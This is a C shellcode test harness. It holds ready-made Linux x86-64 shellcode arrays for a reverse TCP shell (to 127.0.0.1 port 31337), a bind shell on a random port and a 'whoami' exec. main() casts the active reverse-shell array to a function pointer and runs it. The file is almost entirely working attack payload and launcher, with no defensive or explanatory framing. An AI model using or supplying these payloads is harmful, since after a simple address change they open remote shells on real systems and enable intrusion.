#include<stdio.h>
#include<string.h>
//copy whichever is active here
unsigned char code[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x7a\x69\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

unsigned char linux_x64_exec_whoami[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00"
"\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
"\x05";

unsigned char linux_x64_shell_bind_tcp_random_port[] = 
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";

unsigned char linux_x64_shell_reverse_tcp[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x7a\x69\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

main()
{

	printf("Shellcode Length:  %d\n", (int)sizeof(code) - 1);

	int (*ret)() = (int(*)())code;

	ret();

}
